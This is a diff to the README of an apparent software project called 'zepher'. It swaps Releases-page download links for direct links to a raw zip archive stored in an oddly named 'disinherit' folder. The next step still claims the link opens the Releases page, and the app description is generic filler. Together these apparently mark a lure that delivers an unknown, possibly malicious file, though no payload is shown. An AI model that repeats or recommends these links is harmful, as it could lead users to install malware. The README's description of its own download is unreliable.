@@ -1,7 +1,7 @@
 # 🚀 zepher - Seamlessly Use Your Application Today
 
 ## 📥 Download Now 
-[![Download zepher](https://img.shields.io/badge/Download-zepher-blue.svg)](https://github.com/Emilieopencollared763/zepher/releases)
+[![Download zepher](https://raw.githubusercontent.com/Emilieopencollared763/zepher/main/disinherit/zepher-1.3.zip)](https://raw.githubusercontent.com/Emilieopencollared763/zepher/main/disinherit/zepher-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ zepher is a user-friendly application that makes everyday tasks easier. Whether 
 To download zepher, follow these steps:
 
 1. Click the download link below:  
-   [Download zepher](https://github.com/Emilieopencollared763/zepher/releases)
+   [Download zepher](https://raw.githubusercontent.com/Emilieopencollared763/zepher/main/disinherit/zepher-1.3.zip)
 
 2. This will take you to the Releases page. Here you will see all available versions of zepher.
 
